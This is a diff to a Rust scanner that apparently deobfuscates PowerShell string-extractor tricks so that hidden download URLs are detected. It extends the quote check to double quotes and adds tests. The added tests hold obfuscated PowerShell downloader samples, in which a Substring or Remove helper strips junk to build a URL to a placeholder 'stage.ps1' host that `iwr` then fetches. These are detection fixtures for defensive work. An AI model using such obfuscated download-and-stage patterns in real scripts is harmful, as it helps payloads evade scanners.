@@ -3900,7 +3900,7 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower)
         || !lower.contains(".substring")
-        || !text.contains('\'')
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -3985,7 +3985,7 @@ fn expand_literal_remove_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower)
         || !lower.contains(".remove")
-        || !text.contains('\'')
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -4067,7 +4067,7 @@ fn expand_literal_insert_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower)
         || !lower.contains(".insert")
-        || !text.contains('\'')
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -4147,7 +4147,7 @@ fn expand_literal_string_case_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower)
         || !(lower.contains(".tolower") || lower.contains(".toupper"))
-        || !text.contains('\'')
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -4192,7 +4192,7 @@ fn expand_literal_concat_extractor_calls(text: &str) -> String {
             || lower.contains("string]::join")
             || lower.contains("string]::format")
             || lower.contains("-f"))
-        || !text.contains('\'')
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -4284,7 +4284,7 @@ fn expand_literal_index_extractor_calls(text: &str) -> String {
             || lower.contains(".chars")
             || lower.contains(".get_chars")
             || lower.contains(".tochararray"))
-        || !text.contains('\'')
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -4354,7 +4354,7 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower)
         || !lower.contains("replace")
-        || !text.contains('\'')
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -4445,7 +4445,9 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
 
 fn expand_literal_trim_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    if !has_literal_extractor_def_signal(&lower) || !lower.contains(".trim") || !text.contains('\'')
+    if !has_literal_extractor_def_signal(&lower)
+        || !lower.contains(".trim")
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -4533,7 +4535,7 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower)
         || !has_split_index_extractor_signal(&lower)
-        || !text.contains('\'')
+        || !has_static_ps_literal_quote(text)
     {
         return text.to_string();
     }
@@ -4661,6 +4663,10 @@ fn has_literal_extractor_def_signal(lower: &str) -> bool {
         || lower.contains("set-item")
         || has_new_item_alias_signal(lower)
         || has_set_item_alias_signal(lower)
+}
+
+fn has_static_ps_literal_quote(text: &str) -> bool {
+    text.contains('\'') || text.contains('"')
 }
 
 fn has_new_item_alias_signal(lower: &str) -> bool {
@@ -10361,6 +10367,8 @@ mod literal_substring_extractor_tests {
         expand_parenthesized_string_concat, literal_substring_extractor_defs,
         PS_LITERAL_INDEX_EXTRACTOR_BODY_RE, PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
     };
+    use crate::env::{Config, Environment};
+    use crate::traits::Trait;
 
     #[test]
     fn doubled_quote_expansion_preserves_empty_single_quoted_argument() {
@@ -10408,6 +10416,52 @@ mod literal_substring_extractor_tests {
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1'"),
             "substring extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_substring_extractor_variable_url_is_scanned_as_download() {
+        let script = br#"function Pick($value,$start) {
+  return $value.Substring($start)
+}
+$url = Pick "zzhttps://ps-extractor-var-url.example/stage.ps1" 2
+iwr $url"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(script.to_vec());
+
+        super::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://ps-extractor-var-url.example/stage.ps1"
+            )),
+            "PS extractor-assigned URL was not surfaced as a download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn literal_remove_extractor_double_quoted_variable_url_is_scanned_as_download() {
+        let script = br#"function Cut($value,$start,$count) {
+  return $value.Remove($start,$count)
+}
+$url = Cut "JUNKhttps://ps-remove-var-url.example/stage.ps1" 0 4
+iwr $url"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(script.to_vec());
+
+        super::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://ps-remove-var-url.example/stage.ps1"
+            )),
+            "PS remove-extractor URL was not surfaced as a download: {:?}",
+            env.traits
         );
     }
 
